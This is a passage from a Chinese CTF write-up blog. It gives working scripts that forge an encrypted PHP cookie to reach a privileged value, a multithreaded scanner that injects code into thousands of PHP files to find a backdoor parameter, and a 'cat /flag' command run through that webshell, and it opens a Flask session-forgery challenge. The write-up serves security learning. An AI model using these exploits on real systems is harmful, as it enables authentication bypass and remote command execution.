    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest'</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"╮(╯▽╰)╭"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>发现分别有一个加密函数，一个解密函数，分析php代码；</p>
<p>当传入<code>cookie</code>中的<code>user</code>的值经过<code>decrypt</code>函数后返回的值为<code>system</code>，就可以得到flag，所以我们需要得到一串base64码，这一串base64经过<code>decrypt</code>函数能解出<code>system</code>，于是</p>
<p>由<code>guest</code>可以逆推出<code>rnd</code>的值和md5加密后<code>key</code>值的前5位；</p>
<p>再由<code>key</code>的前5位得出所有前6位可能的值，再通过<code>decrypt</code>函数逆推出函数中<code>$txt</code>值的后6位，再在前面加上<code>$rnd</code>的值经过base64加密后得到的16个可能的<code>user</code>值，再拿16个值去bp进行爆破，即可得到flag</p>
<p>写出解密脚本，得到<code>rnd</code>和md5加密后的<code>key</code>值</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
session <span class="token operator">=</span> <span class="token string">'OFZhSEdLVxga'</span><span class="token comment">#本地user值</span>
txt <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>session<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
rnd <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token comment">#拿到rnd的值</span>
ttemp <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
guest <span class="token operator">=</span> <span class="token string">'guest'</span>
tmp <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>guest<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ttemp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ttemp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#拿到key</span>
system <span class="token operator">=</span> <span class="token string">'system'</span>
system1 <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    system1 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>system<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>
md5 <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token comment">#经过md5加密后的每一位数都是0-f之间的数</span>
key_new <span class="token operator">=</span> <span class="token string">''</span>
cookie_new <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>md5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#循环出所有可能的结果</span>
    key_new  <span class="token operator">=</span> key <span class="token operator">+</span> md5<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    session_new <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>system1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        session_new <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key_new<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>system1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    session_new <span class="token operator">=</span> rnd <span class="token operator">+</span> session_new
    cookie_new <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>session_new<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie_new<span class="token punctuation">)</span></code></pre>

<p>运行脚本得到16个base64加密后的值</p>
<p>按理说原题利用bp是可以爆破的出来的，但是这个题目不知道是环境的问题还是什么原因，后端的user值一直在变，意思是说<code>rnd</code>值一直在变，那md5加密后的<code>key</code>值也会变，脚本就毫无意义，所以无果，还是我哪里理解错了。。。。。先放这里，等我啥时候想明白了，或者哪位大佬告诉我原因了再补上。</p>
<p>我来填坑了，上面一步我还是理解错了，刷新界面就算会再次执行php脚本，但也会在比较完<code>$username</code>的值后再进入else函数再执行一遍<code>encrypt</code>函数回显一个新的<code>cookie</code>，所以不用考虑<code>user</code>的值会变的问题，因为在他变之前如果我们已经判断出<code>$username</code>==<code>system</code>了，就会成功拿到flag，而后台不会再调用<code>encrypt</code>函数生成新的<code>user</code>，所以这里是没有问题的，但是爆破的时候还是爆破不出来，为什么呢？我可是怀疑我的python脚本</p>
<p>在网上找个php脚本来执行一下看看二者得出来的base64有什么区别</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$txt1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$txt1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$cookie_guest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'emVTQkZHCh8d'</span><span class="token punctuation">;</span> 
    <span class="token variable">$cookie_guest</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookie_guest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rnd</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cookie_guest</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$ttmp</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cookie_guest</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$key</span> <span class="token operator">.=</span> <span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$ttmp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$key=md5($rnd.$key);</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$txt2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$txt2</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt2</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$md5</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0123456789abcdef'</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$key_new</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token operator">.</span><span class="token variable">$md5</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$cookie_system</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$cookie_system</span> <span class="token operator">.=</span> <span class="token punctuation">(</span><span class="token variable">$key_new</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$txt2</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$cookie_system</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token operator">.</span><span class="token variable">$cookie_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$cookie_system</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>  
<span class="token delimiter important">?></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200220160920767.png" alt loading="lazy"></p>
<p>发现预期结果和我想的并不一样，但是结果却有几分相似，逐步排查后发现到最后一步我得到的key的6位值和php上的是一样的，但结果经过base64编码后就不一样了，应该是编码的问题，在网上查了一番后发现python3默认把脚本文件用<code>utf-8</code>进行编码，python2用的是<code>ascii</code>（我用的是python3，python2不会出现这种情况），而php对base64编码的函数是好像用的ascii进行编码（应该~，后文验证），于是改用脚本base64编码方式，这里使用<code>Latin1</code>进行编码，<strong>Latin1编码是单字节编码，向下兼容ASCII，</strong>其编码范围是0x00-0xFF，0x00-0x7F之间完全和ASCII一致，0x80-0x9F之间是控制字符，0xA0-0xFF之间是文字符号，<a href="https://blog.csdn.net/BLGT_57/article/details/80848492">详</a></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64
session <span class="token operator">=</span> <span class="token string">'QlRxaRVPCx5K'</span>
txt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Latin1"</span><span class="token punctuation">)</span>
rnd <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token comment">#拿到rnd的值</span>
ttemp <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
guest <span class="token operator">=</span> <span class="token string">'guest'</span>
tmp <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>guest<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ttemp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ttemp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#拿到key</span>
system <span class="token operator">=</span> <span class="token string">'system'</span>
system1 <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    system1 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>system<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>
md5 <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span>
key_new <span class="token operator">=</span> <span class="token string">''</span>
cookie_new <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>md5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key_new  <span class="token operator">=</span> key <span class="token operator">+</span> md5<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    session_new <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>system1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        session_new <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key_new<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>system1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    session_new <span class="token operator">=</span> rnd <span class="token operator">+</span> session_new
    cookie_new <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>session_new<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'Latin1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'Latin1'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie_new<span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200220162317195.png" alt loading="lazy"></p>
<p>于是得到的值和php编码出来的完全一致，然后拿到bp中进行爆破拿到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200220162440443.png" alt loading="lazy"></p>
<p>写脚本的水平实在是太菜了，还得多练才行</p>
<h2 id="2019强网杯—高明的黑客"><a href="#2019强网杯—高明的黑客" class="headerlink" title="2019强网杯—高明的黑客"></a>2019强网杯—高明的黑客</h2><p>核心————————–python脚本</p>
<p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-190.png" alt loading="lazy"></p>
<p>将源码下载下来解压后发现有3000多个php文件，于是上大佬脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始时间：  '</span><span class="token operator">+</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
s1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  			<span class="token comment">#这儿设置最大的线程数</span>
filePath <span class="token operator">=</span> <span class="token string">r"C:/Users/71071/Desktop/src/"</span>
os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>					    <span class="token comment">#改变当前的路径</span>
requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">5</span>	<span class="token comment">#设置重连次数，防止线程数过高，断开连接</span>
files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span>				<span class="token comment"># 设置连接活跃状态为False</span>
<span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>												
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token operator">+</span> <span class="token string">'     '</span><span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token comment">#打开php文件，提取所有的$_GET和$_POST的参数</span>
            gets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            posts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>							<span class="token comment">#所有的$_POST</span>
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>							<span class="token comment">#所有的$_GET</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'xxxxxx';"</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'xxxxxx';"</span>
    url <span class="token operator">=</span> <span class="token string">'http://1d941413-1227-4486-890d-581a1eda8638.node3.buuoj.cn/'</span><span class="token operator">+</span><span class="token builtin">file</span>
    req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>		<span class="token comment">#一次性请求所有的GET和POST</span>
    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>							<span class="token comment"># 关闭请求  释放内存</span>
    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
    <span class="token comment">#print(content)</span>
    <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>				<span class="token comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span>
        flag <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?%s='</span><span class="token operator">%</span>a<span class="token operator">+</span><span class="token string">"echo 'xxxxxx';"</span><span class="token punctuation">)</span>
            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>					<span class="token comment"># 关闭请求  释放内存</span>
            <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                flag <span class="token operator">=</span> <span class="token number">1</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">:</span><span class="token string">"echo 'xxxxxx';"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>				<span class="token comment"># 关闭请求  释放内存</span>
                <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                   <span class="token comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span>
            param <span class="token operator">=</span> a
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            param <span class="token operator">=</span> b
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'找到了利用文件： '</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token operator">+</span><span class="token string">"  and 找到了利用的参数：%s"</span> <span class="token operator">%</span>param<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>							<span class="token comment">#加入多线程</span>
   t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>


<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-191.png" alt loading="lazy"></p>
<p>访问xk0SzyKwfzw.php?Efa5BVG=cat /flag即可得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-192.png" alt loading="lazy"></p>
<h2 id="2018HCTF—admin"><a href="#2018HCTF—admin" class="headerlink" title="2018HCTF—admin"></a>2018HCTF—admin</h2><p>核心------------------------ ①flask session 伪造 ；②unicode欺骗 ，<a href="https://www.codercto.com/a/38179.html">参考</a></p>
<p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-183.png" alt loading="lazy"></p>
<h3 id="Flask-session-伪造"><a href="#Flask-session-伪造" class="headerlink" title="Flask session 伪造"></a>Flask session 伪造</h3><p>参考文章：</p>
<ul>
<li><a href="https://xz.aliyun.com/t/3569">Python Web之flask session&amp;格式化字符串漏洞</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#">客户端 session 导致的安全问题</a></li>
</ul>
<p>在index和change界面的源码处分别有两处提示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-184.png" alt loading="lazy"></p>
